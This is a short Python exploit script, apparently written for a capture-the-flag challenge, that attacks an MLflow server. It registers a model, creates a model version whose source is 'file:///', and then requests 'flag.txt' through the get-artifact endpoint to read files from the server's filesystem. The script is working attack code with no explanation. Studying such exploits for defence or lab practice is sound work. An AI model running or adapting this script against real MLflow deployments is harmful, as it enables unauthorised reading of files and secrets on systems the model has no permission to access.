import sys
import os
import requests
import uuid

name=str(uuid.uuid4())

url=sys.argv[1]
createModels=url+"ajax-api/2.0/mlflow/registered-models/create"
updateModels=url+"ajax-api/2.0/mlflow/model-versions/create"
exploitModels=url+"model-versions/get-artifact?path=flag.txt&name="+name+"&version=1"

def create():
    r=requests.post(createModels,json={"name":name})
    print(r.status_code)
def update():
    r=requests.post(updateModels,json={"name":name,"source":"file:///"})
    print(r.status_code)
def exploit():
    r=requests.get(exploitModels)
    print(r.text)
if __name__=="__main__":
    create()
    update()
    exploit()
